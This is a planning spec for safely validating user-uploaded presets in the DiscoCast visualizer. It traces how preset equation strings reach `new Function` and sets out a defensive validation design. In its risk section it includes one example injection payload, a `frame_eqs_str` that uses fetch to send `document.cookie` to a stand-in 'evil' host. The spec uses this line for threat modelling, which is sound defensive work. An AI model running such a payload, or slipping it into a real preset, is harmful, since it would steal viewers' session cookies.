# DiscoCast Preset Validation & Upload Safety — Spec

> Single source of truth for validating shared preset uploads: stopping malicious
> code injection and confirming a file is a genuine, importable DiscoCast preset.
> Gates the public preset gallery/sharing. Sibling to [`discocast-admin-dev.md`](discocast-admin-dev.md).

## Status
- **State:** PLANNED — spec only, nothing built. Captured 2026-06-17 after tracing the
  real import/export/load path in the app.
- **Forcing function:** the public **submission/gallery page** (next feature). Until that
  ships, presets are only ever imported from a user's own disk (low risk). The gallery turns
  that into *distributing strangers' presets to everyone* — so validation must land FIRST.
- **Build order:** validation library → wire into `/api/submit` → THEN the front-facing
  submission page + gallery.

## The critical risk (traced in code, not hypothetical)

The engine compiles preset **equation strings into executable JavaScript**:
```js
// src/vendor/butterchurn.js:6752+
preset.frame_eqs = new Function('a', preset.frame_eqs_str + " return a;");
// …same for init_eqs_str, pixel_eqs_str, and every shapes[].*_eqs_str / waves[].*_eqs_str
```
And a preset's own strings reach it:
- **Export** ([customPresets.js:228](src/customPresets.js#L228)) does `const exported = { ...preset }` — it serializes the **entire** preset verbatim: `frame_eqs_str`, `init_eqs_str`, `pixel_eqs_str`, `warp`, `comp`, `shapes[]`, `waves[]`, plus base64-inlined images.
- **Import** ([customPresets.js:256](src/customPresets.js#L256)) only checks `data.name` exists. **No sanitization** of any code string.
- **Load** ([visualizer.js:592‑612](src/visualizer.js#L592)) keeps the preset's `frame_eqs_str` as `base` and **concatenates** the DiscoCast-generated motion/react/anim equations onto it, then hands the result to the engine → `new Function`.

**Conclusion:** a shared `.json` with `frame_eqs_str: "fetch('//evil',{method:'POST',body:document.cookie}); return a;"` runs **arbitrary JS in every viewer's browser** on play. This is the #1 thing the validation system must close.

## Threat surfaces, ranked
1. **Equation strings → `new Function` (CRITICAL / RCE).** `*_eqs_str` (and legacy `*_eqs`) on the preset and on each `shapes[]` / `waves[]`.
2. **Warp / comp shader source** (`preset.warp`, `preset.comp`) — raw GLSL; malicious shaders = GPU hang/crash (DoS), hard to prove safe statically.
3. **Embedded media** (`images[]._inlinedDataUrl`, base64) — huge blobs = memory/storage DoS; must be size-capped, verified as real decodable images, re-encoded.
4. **Stored XSS** — `name` / `description` rendered to other users in the gallery (admin already escapes; gallery must too).
5. **Prototype pollution** — `__proto__` / `constructor` / `prototype` keys poisoning objects on merge.

## Design principle (SIMPLIFIED after tracing the code): **legit editor presets carry NO code — so reject any that do**

A DiscoCast editor preset is **structured params** (`motionEngine`, `motionReact`, `waveReact`,
`flowStyle`, `imageWarp`, `baseVals`, colours, enums). **Confirmed in code:** the equation strings
are **generated at runtime from those params and NEVER stored** —
[inspector.js:863](src/editor/inspector.js#L863) / [:9424](src/editor/inspector.js#L9424) say so
outright, and the blank template ships `frame_eqs_str:''` etc. ([inspector.js:555](src/editor/inspector.js#L555)).

Therefore a genuinely-exported editor preset has **empty `*_eqs_str`** (and warp/comp regenerated
from `flowStyle`/`imageWarp`). This makes the core rule trivial and airtight:

> **Reject any submission whose `*_eqs_str` / `warp` / `comp` (or shape/wave eqs) are non-empty.**

A legit editor preset passes (its code fields are empty). Anything carrying actual code is either a
raw MilkDrop preset (not allowed — decision #2) or a tampered file → rejected. **No "base by
reference", no EEL grammar parsing, no transpile-and-keep needed.** The importer regenerates all
motion/warp from the structured params, exactly as it does today.
*(Build-time confirm: that `warp`/`comp` are likewise empty/regenerated on saved editor presets, so
"reject non-empty" doesn't reject valid presets. Eqs are confirmed; warp/comp to verify.)*

## Where it runs (resolves the "standalone repos" confusion)

There are **two** apps/repos, each its own Coolify deploy:
- **discocast** — the promo + admin + upload server. **This is where uploads arrive and the gallery
  is served, so this is the security boundary.** Validation lives HERE. One repo, one Coolify push.
- **winamp-screen** — the visualizer app. It only needs validation as *defense-in-depth on disk
  imports*, which is a **separate, optional, later** hardening in that repo.

**So for the gallery to be safe, validation only needs to live in the discocast server.** No
cross-repo "shared module" on day one. (If we later add the app-side check, we revisit sharing the
logic; not now.)

## Validation — server-side in discocast, at upload (`/api/submit`)
1. **Schema allowlist.** Canonical export schema (`schemaVersion: 1`). Validate types / ranges /
   enums. **Drop every key not on the allowlist.**
2. **Reject non-empty code.** If `frame_eqs_str` / `init_eqs_str` / `pixel_eqs_str` / `warp` / `comp`
   (or any `shapes[].*_eqs_str` / `waves[].*_eqs_str`) is non-empty → **reject the submission.** Legit
   editor presets have these empty (see principle above). No EEL validator, no stripping-and-keeping.
3. **Sanitize keys** — strip `__proto__` / `constructor` / `prototype`.
4. **Media** — cap each image + total payload; decode-verify it's a real image; re-encode to strip
   anything smuggled in the bytes.
5. **Text** — length-cap and store raw; escape on render (never trust at display time).

### "Is it a valid DiscoCast import?" — the validity test (two layers)
1. **Static schema validation** — structure / version / types / required fields (fast, deterministic).
   Replaces today's loose sniff (`p.shapes || p.waves || p.baseVals`, [packInstaller.js:26](src/packInstaller.js#L26)).
2. **Headless load smoke test** — reuse the existing `npm run verify:packs` harness (Playwright +
   SwiftShader) to load the **sanitized** preset in a throwaway headless instance and confirm it
   compiles + renders N frames. Proves importability AND catches broken/malicious shaders.
   - **Caveat:** the headless run is a *validity* check, NOT a safety boundary. The static
     code-stripping (Gate 1) is what makes it safe to run; the render test only confirms it works.
     Run it isolated; never treat "it rendered" as "it's safe."

### Backstop
Keep the **moderation queue** (already built). Surface an admin flag like **"⚠ contained custom code
(stripped)"** so any submission that tried to smuggle eqs/shaders gets extra human scrutiny.

## Canonical schema — first sketch (to be finalized)
**Allowed (data):** `schemaVersion`, `name`, `description`, base reference (`baseName`/base id),
`motionEngine`, `motionReact`, `waveReact`, `flowStyle`, `imageWarp` (params only), `baseVals`
(numeric), structured `shapes[]` / `waves[]` (numeric baseVals + motion/react params, **no** `*_eqs_str`),
colours/enums, `images[]` (type, texName, transform params, constrained `_inlinedDataUrl`).
**Stripped/validated (code):** `frame_eqs_str`, `init_eqs_str`, `pixel_eqs_str`, `warp`, `comp`,
`shapes[].*_eqs_str`, `waves[].*_eqs_str`, legacy `*_eqs`.

## Decisions — RESOLVED 2026-06-17
1. **Base reference?** → **Moot.** Editor presets store empty eqs (regenerated at runtime), so there's
   no code to carry and nothing to reference. The rule is simply "reject non-empty code." *(One build-time
   check left: confirm `warp`/`comp` are also empty/regenerated on saved editor presets — eqs are confirmed.)*
2. **Raw MilkDrop in the gallery?** → **No.** Gallery accepts only structured editor presets. Raw MilkDrop
   import stays a local-only, own-risk feature, never distributed.
3. **Where validation lives?** → **discocast server only** (where uploads + gallery live). One repo, one
   Coolify push. App-side disk-import check is a separate, optional later hardening — no shared module now.
4. **EEL grammar validator?** → **Not needed.** With #1 + #2, no code strings are ever kept, so there's
   nothing to grammar-check. Dropped.

## Then: front-facing submission page + gallery (the user's next ask)
Once validation exists and is wired into `/api/submit`: build the public **gallery** (browse approved
presets, big preview, one-click import) and fold the upload-safety messaging into the submit wizard
(clear rejection reasons from Gate 1). Spec that in [`discocast-admin-dev.md`](discocast-admin-dev.md)
or a `discocast-gallery-dev.md` when we get there.
